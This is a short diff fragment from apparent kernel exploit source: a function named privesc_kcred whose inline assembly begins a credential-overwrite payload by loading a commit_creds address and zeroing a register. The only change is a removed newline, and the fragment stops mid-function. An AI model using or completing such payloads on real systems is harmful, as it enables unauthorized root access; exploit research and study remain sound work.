@@ -16,7 +16,7 @@
 void privesc_kcred(void)
 {
     __asm__ __volatile__ (
-        ".intel_syntax noprefix;\n"
+        ".intel_syntax noprefix;"
         // prepare_kernel_cred*/
         "movabs rax, " __stringify(COMMIT_CREDS_ADDR) ";"
         "xor rdi, rdi;"
